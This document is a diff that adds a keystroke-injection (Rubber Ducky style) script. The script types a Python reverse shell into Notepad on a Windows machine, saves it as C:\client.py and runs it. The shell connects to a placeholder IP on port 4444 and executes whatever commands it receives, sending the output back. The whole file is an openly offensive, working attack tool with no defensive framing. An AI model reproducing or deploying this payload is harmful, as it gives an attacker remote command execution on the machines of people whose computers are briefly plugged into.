@@ -1,0 +1,61 @@
+DELAY 1500
+GUI r
+DELAY 100
+STRING notepad.exe
+ENTER
+DELAY 1000
+STRING import os
+ENTER
+STRING import socket
+ENTER
+STRING import subprocess
+ENTER
+STRING host = 'PLEASE ENTER YOUR LOCAL IP'
+ENTER
+STRING port = 4444
+ENTER
+STRING s = socket.socket()
+ENTER
+STRING s.connect((host, port))
+ENTER
+STRING while True:
+ENTER
+STRING     data = s.recv(1024)
+ENTER
+STRING     if data[:2].decode("utf-8") == 'cd':
+ENTER
+STRING         os.chdir(data[:3].decode("utf-8"))
+ENTER
+STRING     if len(data) > 0:
+ENTER
+STRING         cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+ENTER
+STRING         output_bytes = cmd.stdout.read() + cmd.stderr.read()
+ENTER
+STRING         output_str = str(output_bytes, "utf-8")
+ENTER
+STRING         s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+ENTER
+STRING         print(output_str)
+ENTER
+STRING s.close
+ENTER
+DELAY 1000
+CTRL s
+DELAY 500
+CTRL a
+DELAY 500
+STRING C:\client.py
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+GUI s
+DELAY 1000
+STRING client.py
+DELAY 2000
+ENTER
